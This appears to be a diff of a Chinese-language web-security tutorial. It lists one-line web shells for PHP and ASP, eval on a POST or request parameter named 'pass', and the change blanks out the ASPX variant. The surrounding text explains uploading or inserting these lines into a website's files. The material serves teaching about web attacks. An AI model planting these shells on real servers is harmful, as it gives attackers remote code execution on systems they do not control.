@@ -322,7 +322,7 @@ zip://中只能传入绝对路径。
 ```plain
 php的一句话木马： <?php @eval($_POST['pass']);?>
 asp的一句话是：   <%eval request ("pass")%>
-aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
+aspx的一句话是：  <%@ Page Language="Jscript"%> <%                                    %>
 ```
 
 <font style="color:rgb(77, 77, 77);">我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</font>
